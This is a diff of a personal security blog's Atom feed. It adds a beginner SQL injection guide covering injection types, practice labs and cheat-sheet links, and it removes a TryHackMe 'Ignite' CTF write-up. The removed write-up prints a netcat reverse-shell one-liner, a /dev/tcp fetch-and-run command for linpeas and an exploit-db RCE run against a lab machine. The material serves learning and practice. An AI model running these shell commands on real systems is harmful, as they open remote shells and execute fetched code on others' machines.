@@ -1,4 +1,196 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-06T15:54:31+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-06T20:47:49+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">SQL Injection Guide</title><link href="http://localhost:4000/sql-injection-guide/" rel="alternate" type="text/html" title="SQL Injection Guide" /><published>2023-05-06T00:00:00+03:00</published><updated>2023-05-06T00:00:00+03:00</updated><id>http://localhost:4000/sql-injection-guide</id><content type="html" xml:base="http://localhost:4000/sql-injection-guide/"><![CDATA[<p>In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level.  So, I preferred a shorter and clearer explanation.</p>
+
+<p>But it would not be right for me to give only the basic information in my article. I want you to understand the basics, and let the SQL injection fit your logic. So, there are many <a href="#sources">resources</a> that I have shared in this article, check them out. There are many <a href="#labs">labs</a> where you can practice your knowledge. I also shared a lot of <a href="#chs">cheat sheets</a> as a helper.</p>
+
+<p>I hope the article is useful to you. It helps you to learn SQL injection :worried:</p>
+
+<h3 id="topics">Topics</h3>
+
+<ul>
+  <li><a href="#bft">Basic First</a> <br /></li>
+  <li><a href="#sit">SQL Injection and Types</a> <br /></li>
+  <li><a href="#labs">SQL Injection Labs</a> <br /></li>
+  <li><a href="#sources">SQL Injection Sources</a> <br /></li>
+  <li><a href="#chs">SQL Injection Cheat Sheats</a> <br /></li>
+</ul>
+
+<p><br /></p>
+
+<p><img src="/assets/video/sqli-guide/sqli-attack.png" alt="sqli" /></p>
+
+<h3 id="bft">Basic First</h3>
+
+<h3 id="what-is-a-database">What is a Database?</h3>
+
+<p>A <code class="language-plaintext highlighter-rouge">database</code> is where all kinds of data and information are stored electronically.</p>
+
+<h3 id="what-is-database-management-system-dbms">What is Database Management System (DBMS)?</h3>
+
+<p>The database is usually controlled by a <code class="language-plaintext highlighter-rouge">Database Management System (DBMS)</code>. Thanks to this system, data can be easily accessed, managed, changed, updated, and organized.</p>
+
+<p>Most databases today use <code class="language-plaintext highlighter-rouge">SQL</code>.</p>
+
+<h3 id="what-is-sql">What is SQL?</h3>
+
+<p><code class="language-plaintext highlighter-rouge">SQL</code> is a programming language used in databases to query, manipulate and define data, as well as to provide access control.</p>
+
+<p><br /></p>
+
+<h3 id="sit">SQL Injection and Types</h3>
+
+<p>A web application sends SQL queries to use data found in the database. The attacker can inject their own queries into these SQL queries or manipulate the queries. In this case, it can access other information stored in the database. We call this situation the <code class="language-plaintext highlighter-rouge">SQL Injection</code> vulnerability.</p>
+
+<p>A successful <code class="language-plaintext highlighter-rouge">SQL injection</code> attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.  In some cases, an attacker can obtain a persistent backdoor into an organization’s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
+
+<p><br /></p>
+<h3 id="error-based-sqli">Error-Based SQLi</h3>
+
+<p>An error is received in response to submitted SQL queries. The attacker can also send new queries according to this error, or by manipulating the error, he can reach the information he wants to reach from within the output.</p>
+
+<p><br /></p>
+<h3 id="union-based-sqli">Union-Based SQLi</h3>
+
+<p>Multiple <code class="language-plaintext highlighter-rouge">Select</code> queries can be written using the <code class="language-plaintext highlighter-rouge">Union</code> operator. In this case, the attacker can write his own SELECT query with a union operator. But it should be noted that when the union expression is used, the <code class="language-plaintext highlighter-rouge">number of columns must be equal</code> to each other.</p>
+
+<video width="640" height="360" controls="">
+  <source src="/assets/video/sqli-guide/Union-Based-SQLi.mp4" type="video/mp4" />
+</video>
+
+<p><br /></p>
+
+<h3 id="boolean-based-sqli">Boolean-Based SQLi</h3>
+
+<p>It does not return an error or requested information in response to submitted SQL queries. Instead, it gives a <code class="language-plaintext highlighter-rouge">true or false</code> answer. This makes the process very long.</p>
+
+<video width="640" height="360" controls="">
+  <source src="/assets/video/sqli-guide/Boolean-Based-SQLi.mp4" type="video/mp4" />
+</video>
+<p><br /></p>
+
+<h3 id="time-based-sqli">Time-Based SQLi</h3>
+
+<p>It doesn’t return anything in response to submitted SQL queries. However, the attacker tries to see if the query works by adding functions such as <code class="language-plaintext highlighter-rouge">sleep()</code> to these SQL queries.</p>
+
+<video width="640" height="360" controls="">
+  <source src="/assets/video/sqli-guide/Time-Based-SQLi.mp4" type="video/mp4" />
+</video>
+<p><br /></p>
+
+<h3 id="out-of-ban-sqli">Out-of-Ban SQLi</h3>
+
+<p>None of the techniques described so far will work. The application’s response doesn’t depend on whether the query returns any data, on whether a database error occurs or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.</p>
+
+<p>Various network protocols can be used for this purpose, but typically the most effective is DNS.</p>
+
+<video width="640" height="360" controls="">
+  <source src="/assets/video/sqli-guide/Out-of-Band-SQLi.mp4" type="video/mp4" />
+</video>
+<p><br /></p>
+
+<h3 id="warning">Warning</h3>
+
+<p>Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you’re injecting into, it’s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p>
+
+<p><br /></p>
+
+<h3 id="labs">SQL Injection Labs</h3>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/all-labs">Web Security Academy - All Labs</a></li>
+  <li><a href="https://tryhackme.com/room/sqlilab">TryHackMe - SQL Injection Lab</a></li>
+  <li><a href="https://tryhackme.com/room/owaspjuiceshop">TryHackMe - OWASP Juice Shop</a></li>
+  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
+  <li><a href="https://tryhackme.com/room/sqlmap">TryHackMe - Sqlmap</a></li>
+  <li><a href="https://tryhackme.com/room/gamezone">TryHackMe - Game Zone</a></li>
+  <li><a href="https://tryhackme.com/room/poster">TryHackMe - Poster</a></li>
+  <li><a href="https://tryhackme.com/room/chillhack">TryHackMe - Chill Hack</a></li>
+  <li><a href="https://tryhackme.com/room/gallery666">TryHackMe - Gallery</a></li>
+  <li><a href="https://tryhackme.com/room/avengers">TryHackMe - Avengers Blog</a></li>
+  <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a></li>
+  <li><a href="https://tryhackme.com/room/wekorra">TryHackMe - Wekor</a></li>
+  <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
+  <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a></li>
+  <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a></li>
+  <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a></li>
+  <li><a href="https://tryhackme.com/room/metamorphosis">TryHackMe - Metamorphosis</a></li>
+  <li><a href="https://tryhackme.com/room/wwbuddy">TryHackMe - WWBuddy</a></li>
+  <li><a href="https://tryhackme.com/room/unstabletwin">TryHackMe - Unstable Twin</a></li>
+  <li><a href="https://tryhackme.com/room/dailybugle">TryHackMe - Daily Bugle</a></li>
+  <li><a href="https://tryhackme.com/room/yearofthedog">TryHackMe - Year of the Dog</a></li>
+  <li><a href="https://tryhackme.com/room/yearofthepig">TryHackMe - Year of the Pig</a></li>
+  <li><a href="https://tryhackme.com/room/m4tr1xexitdenied">TryHackMe - M4tr1x: Exit Denied</a></li>
+  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">PentesterLab - From SQL Injection to Shell</a></li>
+  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course">PentesterLab - From SQL Injection to Shell: PostgreSQL Edition</a></li>
+  <li><a href="https://ctflearn.com/challenge/88">CTFLearn - Basic Injection</a></li>
+  <li><a href="https://ctflearn.com/challenge/149">CTFLearn - Inj3ction Time</a></li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="sources">SQL Injection Sources</h3>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy - SQL injection</a></li>
+  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
+  <li><a href="https://www.hackerrank.com/domains/sql">HackerRank - SQL</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP - SQL Injection</a></li>
+  <li><a href="https://systemweakness.com/handbook-for-sql-injection-2c12ec29d7ee">Niveet Palan - Handbook for SQL Injection</a></li>
+  <li><a href="https://thegrayarea.tech/p1-bug-hunting-a-step-by-step-guide-to-sql-injection-76f95c8986b0">Graham Zemel - Step by Step Guide to SQL Injection</a></li>
+  <li><a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">Raj Chandel’s Blog - Manual SQL Injection Exploitation Step by Step</a></li>
+  <li><a href="https://infosecwriteups.com/a-technique-that-a-lot-of-sql-injection-beginners-dont-know-atmanand-nagpure-write-up-abdc7c269dd5">Atmanand Nagpure - A technique that a lot of SQL injection beginners don’t know</a></li>
+  <li><a href="https://infosecwriteups.com/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5">goswamiijaya - Identifying &amp; Exploiting SQL Injections: Manual &amp; Automated</a></li>
+  <li><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/SQL%20Injection.md">daffainfo - SQL Injection</a></li>
+  <li><a href="https://infosecwriteups.com/definitive-guide-to-sql-injection-df5ac445eef1">Security Lit Limited - Definitive Guide to SQL Injection</a></li>
+  <li><a href="https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94">goswamiijaya - Exploiting Error Based SQL Injections &amp; Bypassing Restrictions</a></li>
+  <li><a href="https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b">Lee Chun How - Out-of-Band (OOB) SQL Injection</a></li>
+  <li><a href="https://infosecwriteups.com/first-steps-to-sql-injection-45fc0d9aae21">Mcry - First step to an SQL-Injection</a></li>
+  <li><a href="https://infosecwriteups.com/sql-injection-an-overview-1057c5729dc5">Secpy Community - SQL Injection: An Overview</a></li>
+  <li><a href="https://infosecwriteups.com/what-is-sql-injection-6985c298ea20">Frost - What is SQL Injection and How Does it Work</a></li>
+  <li><a href="https://application.security/free-application-security-training/owasp-top-10-sql-injection">Kontra Application Security - SQL Injection</a></li>
+  <li><a href="https://www.hacksplaining.com/exercises/sql-injection#/start">Start - SQL Injections</a></li>
+  <li><a href="https://ctflearn.com/lab/SQL-Injection-Part-1">CTFlearn - SQL Injection</a></li>
+  <li><a href="https://www.imperva.com/learn/application-security/sql-injection-sqli/">Imperva - What is SQL Injection</a></li>
+  <li><a href="https://python.plainenglish.io/pentesting-introduction-to-sql-injection-attack-part-1-5166e4617b71">Edward Low - Edward Low</a></li>
+  <li><a href="https://systemweakness.com/sql-injection-important-things-you-need-to-know-right-now-b173cdea0610">Sudarshan S - SQL INJECTION: IMPORTANT…</a></li>
+  <li><a href="https://systemweakness.com/sql-injection-6348398d6651">Arth Detroja - SQL Injection</a></li>
+  <li><a href="https://a51f221b.medium.com/web-penetration-testing-guide-3a5162731fe6">A51F221B - Web penetration testing guide</a></li>
+  <li><a href="https://www.w3schools.com/sql/default.asp">W3Schools - SQL Tutorial</a></li>
+  <li><a href="https://www.codecademy.com/learn/learn-sql">Codecademy - Learn SQL</a></li>
+  <li><a href="https://www.programiz.com/sql">Programiz - Learn SQL: SQL Tutorial for Beginners</a></li>
+  <li><a href="https://www.tutorialspoint.com/sql/index.htm">TutorialsPoint - SQL Tutorial</a></li>
+  <li><a href="https://roadmap.sh/cyber-security">Cyber Security Roadmap</a></li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="chs">SQL Injection Cheat Sheets</h3>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy - SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://infosecwriteups.com/sql-injection-payload-list-b97656cfd66b">Ismail Tasdelen - SQL Injection Payload List</a></li>
+  <li><a href="https://sqlwiki.netspi.com/">NetSPI SQL Injection Wiki</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">Pentestmonkey - Oracle SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Pentestmonkey - MySQL SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">Pentestmonkey - Postgres SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet">Pentestmonkey - Informix SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentestmonkey - MSSQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet">Pentestmonkey - DB2 SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet">Pentestmonkey - Ingres SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://www.codecademy.com/learn/defending-express-applications-from-sql-injection-xss-csrf-attacks/modules/preventing-sql-injection-attacks/cheatsheet">Codecademy - Preventing SQL Injection Attacks</a></li>
+  <li><a href="https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/">Exploiting hard filtered SQL Injections</a></li>
+  <li><a href="http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html">MS Access SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://www.yazilimkodlama.com/sql-server-2/sql-sorgulari-ve-ornekleri/">Yazılım Kodlama - SQL Sorguları ve SQL Sorgu Örnekleri</a></li>
+  <li><a href="https://cheatography.com/neolex/cheat-sheets/injection-sql/">Cheatography - Injection SQL Cheat Sheet by Neolex</a></li>
+  <li><a href="https://cheatography.com/nimakarimian/cheat-sheets/sql-cheatsheet/">Cheatography - SQL CheatSheet Cheat Sheet by nimakarimian</a></li>
+  <li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">INVICTI - SQL Injection Cheat Sheet</a></li>
+  <li><a href="https://deadlyhacker.wordpress.com/2013/05/09/list-of-google-dorks-for-sql-injection/">Deadly Hacker - List of google dorks for sql injection</a></li>
+  <li><a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/">Perspective Risk - MySQL SQL Injection Practical Cheat Sheet</a></li>
+  <li><a href="https://www.asafety.fr/mysql-injection-cheat-sheet/">MySQL Injection Cheat Sheet</a></li>
+</ul>
+
+<p><br />
+<br />
+I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="sql injection, sqli guide" /><summary type="html"><![CDATA[In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level. So, I preferred a shorter and clearer explanation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/sqli.png" /><media:content medium="image" url="http://localhost:4000/assets/img/sqli.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
 
 <p><br /></p>
 
@@ -1454,136 +1646,4 @@ $ cat /mnt/root/rot/root.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>
-
-<p><br /></p>
-
-<h2 id="1-ignite">1. Ignite</h2>
-
-<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
-Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>
-
-<p><br /></p>
-
-<h3 id="11-usertxt">1.1 User.txt</h3>
-
-<p>Let’s do a nmap scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap" /></p>
-
-<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots" /></p>
-
-<p>But first, let’s check the website running on port 80. 
-Here is a page like this.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home" /></p>
-
-<p>As far as I can see, the fuel cms version 1.4 is used here.
-There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
-Let’s go to this directory and see what comes up.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login" /></p>
-
-<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
-I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel" /></p>
-
-<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
-But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search" /></p>
-
-<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db" /></p>
-
-<p>I’m downloading the exploit file from here. And now let’s run it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload" /></p>
-
-<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey’s reverse shells</a>.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey" /></p>
-
-<p>First, we set up a netcat listener on our own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>Then we enter the following code on the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
-</code></pre></div></div>
-
-<p>And we are inside.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in" /></p>
-
-<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
-$ ls -la /home/www-data
-$ cat /home/www-data/user.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="12-roottxt">1.2 Root.txt</h3>
-
-<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>
-
-<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
-</code></pre></div></div>
-
-<p>Then I run the following code on the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run" /></p>
-
-<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Password: ******</code></strong></p>
-
-<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
-
-<p>First, let’s call a shell using python. Then let’s try logging in.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
-$ su root
-Password: ******
-</code></pre></div></div>
-
-<p>It worked :D. We have successfully rooted.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc" /></p>
-
-<p>Now we can get to root.txt let’s get the flag.</p>
-
-<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="lxd," /><category term="ssh2john," /><category term="security" /><summary type="html"><![CDATA[An Easy Boot2Root box for beginners. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gamingserver.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/gamingserver.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
